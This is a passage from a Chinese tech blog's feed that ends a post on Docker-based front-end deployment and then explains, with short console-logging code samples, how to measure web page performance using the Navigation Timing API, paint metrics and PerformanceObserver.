my-front</code></li></ol><p>在传统的模式下我们完成部署以及调试可能需要一天甚至更多的时间（不熟悉项目的情况下）。使用 Docker 容器部署之后，参照给定的文档，大概 10 分钟左右就可以完成部署了。我们再也不用担心测试环境和线上环境配置统一的问题了，只要使用的是同一个环境，那么它们的环境配置都是一样的。而且交给其他人去进行部署，也不用咱们时刻盯着了，只需几行简单的命令，项目就可以正常跑起来了。</p><p><a name="QiHVS"></a></p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>通过 Docker 来进行私有化部署，可以大大缩减了部署的时间以及人力投入。在其他场景应用中，使用 Docker 容器部署也可以提高项目的开发效率以及项目的可维护性，比如：一些处于维护状态的老旧项目，经过无数代的流转连文档都没有了。一般都是能不动就不动，但是突然某一天需要进行项目的迁移，那可就头大了（想想看，你花费了很大的力气觉得已经迁移好了，却发现在哪个犄角旮旯里少了一个配置文件，这得有多崩溃）。如果说是通过 Docker 进行部署的，迁移的时候，基本上使用镜像进行重新部署以及配置好环境变量就可以了。</p><p>这都是 Docker 的一些比较基本的使用方式，Docker 还有很多进阶的使用方式，如 docker-compose.yml 编排之类的，还需要去进行更深入的探索</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工程化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何衡量一个网页的性能</title>
      <link href="/2024/04/24/frontend/monitor/ru-he-heng-liang-yi-ge-wang-ye-de-xing-neng/"/>
      <url>/2024/04/24/frontend/monitor/ru-he-heng-liang-yi-ge-wang-ye-de-xing-neng/</url>
      
        <content type="html"><![CDATA[<p><a name="fFtQ7"></a></p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>拥有一个良好用户体验的<strong>网页</strong>对于前端开发同学来说是一件必须做，持续做的一件事情，其中首屏的渲染尤为重要，因为用户与网页产生的交互就是从首屏开始的。接下来将介绍网页性能的几个指标以及如何计算和度量这些指标，通过监控和优化这些性能数据来持续优化网页，以提高用户体验。</p><p><a name="fHMne"></a></p><h1 id="Navigation-Timing-API"><a href="#Navigation-Timing-API" class="headerlink" title="Navigation Timing API"></a>Navigation Timing API</h1><p>我们先来看一组 API，Navigation Timing API 提供了用来衡量一个网站性能的数据指标。相比于我们传统的基础手段使用这组 API 可以获取更有用、更精确的数据还可以做更多的数据统计。<br /><code>Navigation Timing API</code> 的兼容性也是相当的不错，兼容我们现在常用的浏览器，包括让人讨厌的 IE9+。完整的兼容性表见<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Navigation_timing_API">链接</a>：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652412321893-3103ab27-7504-4ec2-86de-f0c27637ab4b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652412321893-3103ab27-7504-4ec2-86de-f0c27637ab4b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="rdvBD"></a></p><h2 id="资源加载过程"><a href="#资源加载过程" class="headerlink" title="资源加载过程"></a>资源加载过程</h2><p>当我们的一个资源发起访问（<strong>navigationStart</strong>）后到资源完成加载（<strong>loadEventEnd</strong>）经历如下过程：</p><ol><li>首先就是当资源需要重定向的时候会进入 <strong>redirect</strong>阶段，不需要重定向将会跳过这个阶段<strong>；</strong></li><li>接着就会检查资源是否有 HTTP 缓存的存在，当资源没有缓存的情况下回进入下一步；</li><li>DNS 寻址的过程；</li><li>TCP 协议握手建立通信；</li><li>发起请求；</li><li>响应资源；</li><li>对响应的内容进行处理，如：对 DOM 资源加载并解析；</li><li>最后一步完成资源加载。</li></ol><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/2373519/1652526324086-ff6dce44-f8a3-45d2-b129-df4ceb4ee296.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/2373519/1652526324086-ff6dce44-f8a3-45d2-b129-df4ceb4ee296.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>下面这张图将是对这个过程的标准描述，也是一道前端经典面试题的标准答案，你懂得~</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652362989123-a3a62293-ffac-46af-98b7-cf6c990fd302.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652362989123-a3a62293-ffac-46af-98b7-cf6c990fd302.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><pre><code>上图是W3C第一版的 `Navigation Timing` 的处理模型(Level 1)，从当前浏览器窗口卸载旧页面到加载完成新页面，整个过程一共分为 9 个阶段：</code></pre><ol><li>提示卸载旧文档</li><li>重定向&#x2F;卸载</li><li>应用缓存</li><li>DNS 解析</li><li>TCP 握手</li><li>HTTP 请求处理</li><li>HTTP 响应处理</li><li>DOM 处理</li><li>文档装载完成</li></ol><p>Level 1 的规范从 2012 年底进入候选建议阶段使用已将近 10 年之久，也算完成了其历史使命，今年的 3 月 20(2022 年 3 月 10 日)正式进入 Level2 的规范( WorkingDraft )，Level2 相比较 Level1 精度更高。</p><p>Level2 处理模型如下：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/jpeg/26114887/1652755971880-e308a284-76c4-41c4-95bb-b3585ec8beac.jpeg" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/jpeg/26114887/1652755971880-e308a284-76c4-41c4-95bb-b3585ec8beac.jpeg" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />图片来源：<a href="https://www.w3.org/TR/navigation-timing-2/">https://www.w3.org/TR/navigation-timing-2/</a></p><p>Level2 将整个过程划分为了 11 个阶段，各阶段指标明细：</p><table><thead><tr><th><strong>序号</strong></th><th><strong>指标</strong></th><th><strong>解释</strong></th></tr></thead><tbody><tr><td><strong>1</strong></td><td><strong>navigationStart</strong></td><td>表示从上一个文档卸载结束时的 unix 时间戳，如果没有上一个文档，这个值将和 fetchStart 相等。</td></tr><tr><td><strong>2</strong></td><td><strong>unloadEventStart</strong></td><td>表示前一个网页（与当前页面同域）unload 的时间戳，如果无前一个网页 unload 或者前一个网页与当前页面不同域，则值为 0。</td></tr><tr><td><strong>3</strong></td><td><strong>unloadEventEnd</strong></td><td>返回前一个页面 unload 时间绑定的回掉函数执行完毕的时间戳。</td></tr><tr><td><strong>4</strong></td><td><strong>redirectStart</strong></td><td>第一个 HTTP 重定向发生时的时间。有跳转且是同域名内的重定向才算，否则值为 0。</td></tr><tr><td><strong>5</strong></td><td><strong>redirectEnd</strong></td><td>最后一个 HTTP 重定向完成时的时间。有跳转且是同域名内部的重定向才算，否则值为 0。</td></tr><tr><td><strong>6</strong></td><td><strong>fetchStart</strong></td><td>浏览器准备好使用 HTTP 请求抓取文档的时间，这发生在检查本地缓存之前。</td></tr><tr><td><strong>7</strong></td><td><strong>domainLookupStart</strong>domainLookupEnd</td><td>DNS 域名查询开始&#x2F;结束的时间，如果使用了本地缓存（即无 DNS 查询)或持久连接，则与 fetchStart 值相等。</td></tr><tr><td><strong>8</strong></td><td><strong>connectStart</strong></td><td>HTTP(TCP)开始&#x2F;重新建立连接的时间，如果是持久连接，则与 fetchStart 值相等</td></tr><tr><td><strong>9</strong></td><td><strong>connectEnd</strong></td><td>HTTP(TCP)完成建立连接的时间（完成握手），如果是持久接，则与 fetchStart 值相等。</td></tr><tr><td><strong>10</strong></td><td><strong>secureConnectionStart</strong></td><td>HTTPS 连接开始的时间，如果不是安全连接，则值为 0。</td></tr><tr><td><strong>11</strong></td><td><strong>requestStart</strong></td><td>HTTP 请求读取真实文档开始的时间（完成建立连接），包括从本地读取缓存。</td></tr><tr><td><strong>12</strong></td><td><strong>responseStart</strong></td><td>HTTP 开始接收响应的时间（获取到第一个字节），包括从本地读取缓存。</td></tr><tr><td><strong>13</strong></td><td><strong>responseEnd</strong></td><td>HTTP 响应全部接收完成的时间（获取到最后一个字节），包括本地读取缓存。</td></tr><tr><td><strong>14</strong></td><td><strong>domLoading</strong></td><td>开始解析渲染 DOM 树的时间，此时 Document..readyState 变为 loading,并将抛出 readystatechange 相关事件。</td></tr><tr><td><strong>15</strong></td><td><strong>domlnteractive</strong></td><td>完成解析 DOM 树的时间，Document..readyState 变为 interactive,并将抛出 readystatechange 相关事件，注意只是 DOM 树解析完成，这时候并没有开始加载网页内的资源。</td></tr><tr><td><strong>16</strong></td><td><strong>domContentLoadedEventStart</strong></td><td>DOM 解析完成后，网页内资源加载开始的时间，在 DOMContentLoaded 事件抛出前发生。</td></tr><tr><td><strong>17</strong></td><td><strong>domContentLoadedEventEnd</strong></td><td>DOM 解析完成后，网页内资源加载完成的时间（如 JS 脚本加载执行完毕)</td></tr><tr><td><strong>18</strong></td><td><strong>domComplete</strong></td><td>DOM 树解析完成，且资源也准备就绪的时间，Document..readyState 变为 complete,并将抛出 readystatechange 相关事件。</td></tr><tr><td><strong>19</strong></td><td><strong>loadEventStart</strong></td><td>load 事件发送给文档，也即 load 回调函数开始执行的时间。</td></tr><tr><td><strong>20</strong></td><td><strong>loadEventEnd</strong></td><td>load 事件的回调函数执行完毕的时间。</td></tr></tbody></table><p><a name="TOnrM"></a></p><h2 id="计算页面加载的总时长"><a href="#计算页面加载的总时长" class="headerlink" title="计算页面加载的总时长"></a>计算页面加载的总时长</h2><p><code>Navigation Timing API</code> 为 window 下挂的 Performance 对象增加了 timing 和 navigation 属性，通过<code>window.performance.timing</code>可以得到 <code>**PerformanceTiming**</code>** **接口，我们可以使用接口里面提供的<code>**loadEventEnd**</code>减去<code>**navigationStart\*\*</code>得到页面加载总的时长。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">    &lt;title&gt;页面性能&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      // 书签支持的 js 脚本格式：javascript:&lt;code&gt;</span><br><span class="line">      javascript: (() =&gt; &#123;</span><br><span class="line">        const perfData = window.performance.timing;</span><br><span class="line">        const pageLoadTime = perfData.loadEventEnd - perfData.navigationStart;</span><br><span class="line">        console.log(&quot;页面加载耗时：&quot;, pageLoadTime, &quot;ms&quot;);</span><br><span class="line">      &#125;)();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><br /> 当你在自己的电脑中运行这段代码的时候会发现，输出的耗时居然是负数，那是因为本地服务的访问速度是很快了，所以整个页面的加载时间几乎为 0，我们可以将里面的 JavaScript 脚本保存到你的浏览器书签，在随便找一个网站等待加载完成后点击这个书签就可以在控制台输出正常的页面加载的完整时间了。</p><pre><code>下图就是我们通过上述脚本获取到的页面耗时在 6798 毫秒，那么这个数据是否正确呢？其实浏览器的开发者工具也为我们统计了这个数据，可以接着看下面的第二张图的右下角。</code></pre><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652369421894-e385f195-22be-4c7c-9d5b-5799cae0fde1.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652369421894-e385f195-22be-4c7c-9d5b-5799cae0fde1.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>下图右下角的时间是浏览器开发者工具为我们统计到的数据：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652369350911-aba004f9-3cf7-4462-8c8d-f96a0dedb083.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652369350911-aba004f9-3cf7-4462-8c8d-f96a0dedb083.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>根据前面的资源加载的流程图我们就可以获取到任意一段有意义的时间，比如：资源请求的耗时我们就可以使用 <code>**responseEnd**</code>** <strong>减去 <code>**requestStart**</code></strong> <strong>得到，DOM 加载的整个时间可以使用 <code>**domComplete**</code></strong> <strong>减去 <code>**domLoading**</code></strong> **得到等。</p><p><a name="p2QaM"></a></p><h2 id="如何得到更精确的数据"><a href="#如何得到更精确的数据" class="headerlink" title="如何得到更精确的数据"></a>如何得到更精确的数据</h2><p>前面我们使用的 API 所提供的数据通过查看均是毫秒级别的，也看得到 API 均被标注的弃用的标识。那么更高精度的数据我们就需要使用一个新的 API 来获取，最终得到一个 <code>**PerformanceNavigationTiming**</code>** **对象，这个对象提供了纳秒级别的数据统计，我们一起来执行下面的代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  window.onload = function () &#123;</span><br><span class="line">    // PerformanceEntryList</span><br><span class="line">    const entries = window.performance.getEntries();</span><br><span class="line">    console.log(entries);</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>我们运行上述代码将在控制台得到下面的数组，其中数组的第一项的 <strong>type</strong>为 <strong>navigate</strong>，这表示我们是通过在浏览器的地址栏输入 URL 打开的页面，也可以是通过点击链接、表单提交、脚本初始化，但不包括刷新页面，回退等，<a href="https://developer.mozilla.org/en-US/docs/Web/API/PerformanceNavigationTiming/type">type 的更多描述见 mdn</a>。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652372537362-2c266d2d-1449-4558-9d5c-d0a9913ac164.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652372537362-2c266d2d-1449-4558-9d5c-d0a9913ac164.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>上图中的 name 属性在这里也需要说明一下，可以看到数据第一项的 name 表示这次资源请求的地址，其他的两个是特殊的标识，其内容取决于<code>**PerformanceEntry**</code>对象的<code>**subtype**</code>和<code>**PerformanceEntry.entryType**</code>，所以特地摘录了 mdn 上的属性表格，</p><table><thead><tr><th><strong>Value</strong></th><th><strong>Subtype</strong></th><th><strong>EntryType</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>URL</strong></td><td>PerformanceNavigationTiming</td><td>frame, navigation</td><td>文档的地址</td></tr><tr><td><strong>URL</strong></td><td>PerformanceNavigationTiming</td><td>resource</td><td>请求资源所解析的 URL</td></tr><tr><td><strong>DOMString</strong></td><td>PerformanceMark</td><td>mark</td><td>执行 performance.mark()创建标记时使用的名称</td></tr><tr><td><strong>DOMString</strong></td><td>PerformanceMeasure</td><td>measure</td><td>执行 performance.measure()时使用的名称</td></tr><tr><td><strong>DOMString</strong></td><td>PerformancePaintTiming</td><td>paint</td><td>first-paint**first-contentful-paint</td></tr></tbody></table><p>我们也可以通过指定 <code>**EntryType**</code>** <strong>来获取对应的信息，下面的代码我们将只会获取到 <code>**first-paint**</code>和<code>**first-contentful-paint**</code></strong> **两个元素：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  window.onload = function () &#123;</span><br><span class="line">    const entries = window.performance.getEntriesByType(&#x27;paint&#x27;);</span><br><span class="line">    console.log(entries);</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652412617415-a393427d-3e2a-4e04-ab14-ac90dfd2fd91.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652412617415-a393427d-3e2a-4e04-ab14-ac90dfd2fd91.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="k9I4l"></a></p><h1 id="常见的性能指标"><a href="#常见的性能指标" class="headerlink" title="常见的性能指标"></a>常见的性能指标</h1><p>我们在前面输出<code>**PerformanceNavigationTiming**</code>对象时就已经看到了 <code>name</code> 非 <code>first-paint</code> 和 <code>first-contentful-paint</code>的对象，这两个就是典型的前端性能指标，其次还有几个，我们用一个表格来看一下：</p><table><thead><tr><th><strong>指标</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td><a href="https://developer.mozilla.org/en-US/docs/Glossary/First_paint">FP</a></td><td>First Paint，首次绘制，指浏览器从开始请求网站到屏幕渲染第一个像素点的时间。</td></tr><tr><td><a href="https://developer.mozilla.org/en-US/docs/Glossary/First_contentful_paint">FCP</a></td><td>First Contentful Paint，首次内容绘制，指浏览器渲染出第一个内容的时间，这个内容可以是文本、图片、背景图、非空白的画布、SVG 等，并不包括 iframe 元素。</td></tr><tr><td><a href="https://developer.mozilla.org/en-US/docs/Web/API/LargestContentfulPaint">LCP</a></td><td>Largest Contentful Paint，最大内容绘制，指网页被展示在视口中的最大内容的显示时间。</td></tr><tr><td><a href="https://developer.mozilla.org/en-US/docs/Glossary/first_meaningful_paint">FMP</a></td><td>First Meaningful Paint，首次有效绘制，指网页渲染出第一个关键内容的时间。区别与 FCP，FMP 指第一块有意义的内容绘制。如：博客网站的关键内容指的是正文，视频网站的关键内容指的是视频播放器，电商网站的关键内容指的是商品列表或商品详情等。因其计算过于复杂，得到的结果并不是非常准确，在 Lighthouse6.0 中用 LCP 替换了 FMP。</td></tr><tr><td><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/DOMContentLoaded_event">DCL</a></td><td>DOMContentLoaded，指网页中的 DOM 加载并完成解析后触发此事件， 但不包括样式、图像等。</td></tr><tr><td><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/load_event">L</a></td><td>load，指网页完成了所有的加载包括 DOM、样式、图像等内容后触发此事件。</td></tr></tbody></table><p><br />下图是在控制台的性能页签抓取的数据：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652532659828-88659f81-705d-48f4-b2ec-26bd0a9da745.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652532659828-88659f81-705d-48f4-b2ec-26bd0a9da745.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="QoM67"></a></p><h1 id="实时获取性能指标"><a href="#实时获取性能指标" class="headerlink" title="实时获取性能指标"></a>实时获取性能指标</h1><p>上述的性能指标都存在一个问题，就是我们只能获取在 <code>**onload**</code>执行前的性能数据，之后变化的数据将无法获取。所以在 HTML5 中为我们新增的 <code>**PerformanceObserver**</code>** **对象，可以使用观察者的模式来拿到每次发生变化后的数据，兼容性见下表：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652424770731-034a7b62-beb3-493a-b92d-75be14977cea.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652424770731-034a7b62-beb3-493a-b92d-75be14977cea.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="ugAiH"></a></p><h3 id="获取-FP-和-FCP"><a href="#获取-FP-和-FCP" class="headerlink" title="获取 FP 和 FCP"></a>获取 FP 和 FCP</h3><ol><li>实例化 <strong>PerformanceObserver</strong> 对象；</li><li>在构造函数位置指定处理函数；</li><li>调用 <strong>observe</strong> 并指定 <strong>entryTypes</strong> 使其包含 <strong>paint</strong>；</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  const ob = new PerformanceObserver((list) =&gt; &#123;</span><br><span class="line">    list.getEntries().forEach((entrie) =&gt; &#123;</span><br><span class="line">      console.log(&quot;entrie：&quot;, entrie);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  ob.observe(&#123; entryTypes: [&quot;paint&quot;] &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>下图输出的信息就是对应的 fp 和 fcp 的信息了：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652423090608-8a5a694d-c516-4664-a00b-b8e98ad149af.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652423090608-8a5a694d-c516-4664-a00b-b8e98ad149af.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="dmq9U"></a></p><h3 id="获取其他资源的性能数据"><a href="#获取其他资源的性能数据" class="headerlink" title="获取其他资源的性能数据"></a>获取其他资源的性能数据</h3><ol><li>调整 **observe **函数中 **entryTypes **使其包含 **resource **；</li><li>将 ob 的实例化提到其他脚本执行之前；</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">  &lt;title&gt;页面性能&lt;/title&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    const ob = new PerformanceObserver((list) =&gt; &#123;</span><br><span class="line">      list.getEntries().forEach((entrie) =&gt; &#123;</span><br><span class="line">        console.log(&quot;entrie：&quot;, entrie);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    ob.observe(&#123; entryTypes: [&quot;resource&quot;] &#125;);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">  &lt;script src=&quot;./index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure><p>下图输出的信息就包含了此脚本加载的性能信息：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652423372379-58caddc0-4162-4f60-a406-034e5b35c4de.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652423372379-58caddc0-4162-4f60-a406-034e5b35c4de.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="k2rWZ"></a></p><h3 id="获取脚本运行到特定位置的性能数据"><a href="#获取脚本运行到特定位置的性能数据" class="headerlink" title="获取脚本运行到特定位置的性能数据"></a>获取脚本运行到特定位置的性能数据</h3><ol><li>再次调整**observe **函数中 **entryTypes **使其包含 **resource **；</li><li>调用 window.performance.mark(“own”);进行打点，own 为自定义标记；</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">  &lt;title&gt;页面性能&lt;/title&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    const ob = new PerformanceObserver((list) =&gt; &#123;</span><br><span class="line">      list.getEntries().forEach((entrie) =&gt; &#123;</span><br><span class="line">        console.log(&quot;entrie：&quot;, entrie);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    ob.observe(&#123; entryTypes: [&quot;mark&quot;] &#125;);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">  &lt;script src=&quot;./index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    console.log(&quot;↓↓↓↓↓↓↓↓↓↓↓&quot;);</span><br><span class="line">    window.performance.mark(&quot;own&quot;);</span><br><span class="line">    console.log(&quot;↑↑↑↑↑↑↑↑↑↑&quot;);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure><p>下图输出的信息就包含了执行到此标记时的耗时：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652423683678-df09af03-ff22-4141-9166-84d0cb76401d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652423683678-df09af03-ff22-4141-9166-84d0cb76401d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><br /><strong>计算 DOM 插入的时间：</strong></p><ol><li>编写一个 addDom 函数，内部实现一个 div 插入到 body 的完整过程；</li><li>在 addDom 函数的开始和结束位置分别使用 mark 进行打标记；</li><li>当我们触发页面中的 add dom 按钮的时候就会接收到包含我们自定义标记两个 **PerformanceMark **对象，其中包含的时间相减就可以得到 DOM 插入的时间了。</li></ol><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652424431078-5ae26104-5175-4336-9bf1-273743481f6b.png" class="lazyload placeholder" 